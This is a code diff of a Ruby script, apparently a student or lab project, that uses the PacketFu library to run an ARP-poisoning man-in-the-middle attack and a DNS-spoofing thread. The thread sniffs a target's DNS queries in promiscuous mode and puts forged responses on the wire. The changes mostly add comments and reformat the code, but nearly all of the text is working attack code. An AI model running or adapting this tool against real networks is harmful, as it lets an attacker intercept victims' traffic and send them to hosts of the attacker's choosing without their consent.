@@ -60,7 +60,10 @@ def runspoof(arp_packet_target,arp_packet_router)
 end
 
 # Starts the DNS sniffing and spoofing thread.
-# Looks for 
+# Looks for DNS queries coming from the target
+# and responds to them with crafted responses.
+# @param [String] t_ip
+# - IP address of target
 def spoof_dns(t_ip)
   puts "DNS Spoofing Thread Started"
   #look for dns packets from target
@@ -68,26 +71,25 @@ def spoof_dns(t_ip)
   #filter = "udp and port 53"
 
   begin
-  cap = PacketFu::Capture.new(:iface => @iface,
-    :start => true,
-    :promisc => true,
-    :filter=> filter)
-  cap.stream.each do |p|
-    pkt = PacketFu::Packet.parse(p)
-    if pkt.is_udp?
-      dns_hdr_flag = pkt.payload[2].unpack('h*')[0].chr+pkt.payload[3].unpack('h*')[0].chr
+    cap = PacketFu::Capture.new(:iface => @iface,
+      :start => true,
+      :promisc => true,
+      :filter=> filter)
+    cap.stream.each do |p|
+      pkt = PacketFu::Packet.parse(p)
+      if pkt.is_udp?
+        #check if query
+        dns_hdr_flag = pkt.payload[2].unpack('h*')[0].chr+pkt.payload[3].unpack('h*')[0].chr
+        if dns_hdr_flag == '10'
+          domain_name = extract_domain(pkt.payload[13..-1])
 
-      #check if query
-      if dns_hdr_flag == '10'
-        domain_name = extract_domain(pkt.payload[13..-1])
+          puts "Domain name is: #{domain_name}"
 
-        puts "Domain name is: #{domain_name}"
-
-        #build and send response
-        send_dns_response(pkt, domain_name)
+          #build and send response
+          send_dns_response(pkt, domain_name)
+        end
       end
     end
-  end
   rescue Exception => ex
     puts "something bad happening in dns"
     puts ex.message
@@ -95,6 +97,10 @@ def spoof_dns(t_ip)
   end
 end
 
+# Extracts and builds domain name in canonical format
+# ie. www.website.tld
+# @param [String] q_name
+# - domain name in dns header payload format
 def extract_domain(q_name)
   #take q name and extract all subdomains
 
@@ -103,7 +109,7 @@ def extract_domain(q_name)
   loop {
     if q_name[n].unpack('H*') == ["00"]
       return domain_name
-    elsif !q_name[n].match(/^[[:alpha:]]$/)
+    elsif !q_name[n].match(/^[[:alpha:]]$/) #hex and not 0x00
       domain_name += '.'
       n += 1
     else
@@ -113,8 +119,14 @@ def extract_domain(q_name)
   }
 end
 
+# Crafts a DNS response based on a DNS Query requested
+# from target client. Builds and recalcs the packets
+# and puts it on the wire.
+# @param [PacketFu::Packet] orig_pkt
+# - the original DNS packet intercepted from client
+# @param [String] name
+# - canonical comain name
 def send_dns_response(orig_pkt, name)
-
   #UDP/IP headers
   #dns_resp = PacketFu::UDPPacket.new(:config => PacketFu::Utils.whoami?(:iface => @iface))
   dns_resp = PacketFu::UDPPacket.new
@@ -164,12 +176,6 @@ def send_dns_response(orig_pkt, name)
 end
 
 ## Main
-
-=begin doesnt seem to be working consistently enough
-@target_mac = get_machine_addr(@target_ip)
-@sender_mac = get_machine_addr(@sender_ip)
-@router_mac  = get_machine_addr(@router_ip)
-=end
 
 # Construct the target's packet
 arp_packet_target = PacketFu::ARPPacket.new()
